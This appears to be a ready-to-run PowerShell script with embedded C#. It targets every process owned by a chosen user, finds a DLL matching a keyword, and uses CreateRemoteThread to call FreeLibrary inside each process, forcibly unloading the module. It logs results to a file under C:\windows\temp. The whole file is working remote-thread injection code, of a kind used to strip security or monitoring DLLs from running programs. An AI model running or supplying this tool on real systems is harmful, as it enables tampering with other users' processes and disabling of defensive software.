$csharpCode = @'
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

public class DllScanner
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(
        uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        UIntPtr dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out UIntPtr lpThreadId);

    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_VM_READ           = 0x0010;
    const uint PROCESS_CREATE_THREAD     = 0x0002;
    const uint PROCESS_VM_OPERATION      = 0x0008;
    const uint PROCESS_VM_WRITE          = 0x0020;

    public static void ScanAndUnload(string userFilter, string dllKeyword)
    {
        string logPath = @"C:\windows\temp\results.log";
        using (StreamWriter writer = new StreamWriter(logPath, true))
        {
            writer.WriteLine("[+] Starting scan at {0}", DateTime.Now);

            IntPtr hKernel = GetModuleHandle("kernel32.dll");
            IntPtr addrFreeLibrary = GetProcAddress(hKernel, "FreeLibrary");

            foreach (Process proc in Process.GetProcesses())
            {
                try
                {
                    string owner = GetProcessOwner(proc);
                    if (owner == null) continue;
                    string userOnly = owner.Contains("\\") ? owner.Split('\\')[1] : owner;
                    if (!userOnly.Equals(userFilter, StringComparison.OrdinalIgnoreCase))
                        continue;

                    writer.WriteLine("[>] {0} ({1}) owned by {2}", proc.ProcessName, proc.Id, owner);

                    foreach (ProcessModule mod in proc.Modules)
                    {
                        if (mod.FileName.IndexOf(dllKeyword, StringComparison.OrdinalIgnoreCase) < 0)
                            continue;

                        writer.WriteLine("  [+] Found matching DLL: {0}", mod.FileName);
                        writer.WriteLine("      BaseAddress: 0x{0:X}", mod.BaseAddress.ToInt64());

                        IntPtr hProc = OpenProcess(
                            PROCESS_QUERY_INFORMATION |
                            PROCESS_VM_READ           |
                            PROCESS_CREATE_THREAD     |
                            PROCESS_VM_OPERATION      |
                            PROCESS_VM_WRITE,
                            false, proc.Id);

                        if (hProc == IntPtr.Zero)
                        {
                            writer.WriteLine("      [!] Could not open process: {0}", Marshal.GetLastWin32Error());
                            continue;
                        }

                        try
                        {
                            UIntPtr threadId;
                            IntPtr hThread = CreateRemoteThread(
                                hProc,
                                IntPtr.Zero,
                                UIntPtr.Zero,
                                addrFreeLibrary,
                                mod.BaseAddress,
                                0,
                                out threadId);

                            if (hThread != IntPtr.Zero)
                                writer.WriteLine("      [*] FreeLibrary queued (TID {0})", threadId);
                            else
                                writer.WriteLine("      [!] CreateRemoteThread failed: {0}", Marshal.GetLastWin32Error());
                        }
                        finally
                        {
                            CloseHandle(hProc);
                        }

                        System.Threading.Thread.Sleep(200);
                        Process refreshed = Process.GetProcessById(proc.Id);
                        bool stillLoaded = false;
                        try
                        {
                            foreach (ProcessModule m2 in refreshed.Modules)
                            {
                                if (m2.FileName.IndexOf(dllKeyword, StringComparison.OrdinalIgnoreCase) >= 0)
                                {
                                    stillLoaded = true;
                                    break;
                                }
                            }
                        }
                        catch { /* skip if enumeration fails */ }

                        if (!stillLoaded)
                            writer.WriteLine("      [✔] Confirmed: {0} is unloaded", dllKeyword);
                        else
                            writer.WriteLine("      [✖] Still loaded: {0}", dllKeyword);
                    }
                }
                catch
                {
                }
            }

            writer.WriteLine("[+] Scan complete at {0}", DateTime.Now);
            writer.WriteLine();
        }
    }

    static string GetProcessOwner(Process proc)
    {
        try
        {
            string query = "SELECT * FROM Win32_Process WHERE ProcessId=" + proc.Id;
            using (ManagementObjectSearcher mos = new ManagementObjectSearcher(query))
            {
                foreach (ManagementObject mo in mos.Get())
                {
                    object[] args = new object[2];
                    int ret = Convert.ToInt32(mo.InvokeMethod("GetOwner", args));
                    if (ret == 0)
                        return args[1] + "\\" + args[0];
                }
            }
        }
        catch { }
        return null;
    }
}
'@

Add-Type -TypeDefinition $csharpCode -Language CSharp -ReferencedAssemblies System.Management
[DllScanner]::ScanAndUnload('target_username_here', 'keyword_file.dll')

# Results in C:\windows\temp\results.log
